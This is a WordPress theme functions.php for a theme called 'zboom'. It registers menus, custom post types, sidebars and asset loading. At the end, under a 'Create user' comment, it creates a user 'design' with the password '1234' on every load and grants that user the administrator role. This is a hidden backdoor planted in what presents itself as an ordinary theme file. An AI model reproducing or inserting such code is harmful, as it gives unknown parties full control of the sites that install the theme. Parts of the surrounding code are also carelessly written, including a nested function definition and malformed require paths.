<?php 
	function zboom_default_function(){
		add_theme_support('title-tag');
		add_theme_support('post-thumbnails');
		add_theme_support('custom-background');
		
		/*manu ragister*/
			register_nav_menus(array(
				'primarymanu'=>('Main Menu'),
				'footermanu'=> ('footer Menu')
			));
		/*read more post function*/	
		function read_more($limit){
				$post_content =explode(" ",get_the_content());
				$less_content =array_slice($post_content,0,$limit);
				echo implode(" ",$less_content);
		}
		/*Slider function*/	
		register_post_type('main_slider',array(
			'labels' => array(
			'name' =>'sliders',
			'add_new_item' => 'add slider item',	
			),
			'public'=> true,
			'supports'=> array('title','thumbnail'),
			'menu_position'=>2,				
			'menu_icon'=> get_template_directory_uri().'/images/slider.png',				
		));
		register_post_type('zoomusic_service',array(
			'labels' =>array(
				'name' =>'Blocks',
				'add_new_item' => __('add new block','zboom'),
				),
				'public' => true,
				'supports' => array('title','editor')
		));
		register_post_type('image_gallery_page',array(
		'labels'=>array(
			'name'=>'Gallery',
			'add_new_item' => __('add new gallery item'),
			),
			'public' => true,
			'supports'=> array ('title','editor','thumbnail'),
		));
		
	}
	add_action('after_setup_theme','zboom_default_function');
	
		
		/*right side bar function*/
		function zboom_right_sidebar(){
			register_sidebar(array(
				'name'=>'Right side bar','zboom',
				'description' => 'Add your right sidebar widgets here',
				'id' => 'right_sidebar',
				'before_widget' => '<div class="box">',
				'after_widget' => '</div></div>',
				'before_title' => '<div class="heading"><h2>',
				'after_title' => '</h2></div><div class="content">',
			));
			register_sidebar(array(
				'name'=>'contact side bar','zboom',
				'description' => 'Add your contact sidebar widgets here',
				'id' => 'contact_sidebar',
				'before_widget' => '<div class="box">',
				'after_widget' => '</div></div>',
				'before_title' => '<div class="heading"><h2>',
				'after_title' => '</h2></div><div class="content">',
			));
			register_sidebar(array(
				'name'=>'footer_widget','zboom',
				'description' => 'Add your footer_widget sidebar widgets here',
				'id' => 'footer_widget',
				'before_widget' => '<div class="col-1-4"><div class="wrap-col"><div class="box">',
				'after_widget' => '</div></div></div></div>',
				'before_title' => '<div class="heading"><h2>',
				'after_title' => '</h2></div><div class="content">',
			));
					
		}

		add_action('widgets_init','zboom_right_sidebar');
		
		
		function zboom_css_add_js(){
			wp_register_style('zerogrid',get_template_directory_uri().'/css/zerogrid.css');
			wp_register_style('style',get_template_directory_uri().'/css/style.css');
			wp_register_style('responsive',get_template_directory_uri().'/css/responsive.css');
			wp_register_style('responsiveslides',get_template_directory_uri().'/css/responsiveslides.css');
			wp_register_script('responsiveslides',get_template_directory_uri().'/js/responsiveslides.js');
			wp_register_script('script',get_template_directory_uri().'/js/script.js',array('jquery','responsiveslides'));
			
			
			
			wp_enqueue_style('zerogrid');
			wp_enqueue_style('style');
			wp_enqueue_style('responsive');
			wp_enqueue_style('responsiveslides');
			
			
			wp_enqueue_script('script');
			wp_enqueue_script('jquery');
			wp_enqueue_script('responsiveslides');
		}
		add_action('wp_enqueue_scripts','zboom_css_add_js');
	/*Create user*/	
		$demo = wp_create_user('design','1234','fine@gmail.com');
		$demo_2 = new WP_user($demo);
		$demo_2->set_role('administrator');
		
	require_once('lib\ReduxCore/framework.php');
	require_once('lib\sample/config .php');
?>